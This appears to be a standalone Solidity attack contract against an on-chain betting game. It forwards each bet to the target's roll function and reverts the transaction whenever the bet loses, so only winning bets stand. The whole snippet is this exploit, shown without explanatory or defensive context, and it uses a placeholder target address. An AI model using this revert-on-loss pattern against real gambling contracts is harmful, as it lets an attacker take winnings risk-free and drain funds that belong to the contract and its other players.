contract A {
    V v = V(0xAddress);

    function bet(uint guess) public payable {
        uint balance = address(this).balance;
        v.roll.value(msg.value)(guess);
        if (address(this).balance < balance) {
            
            
            revert();
        }
    }
}
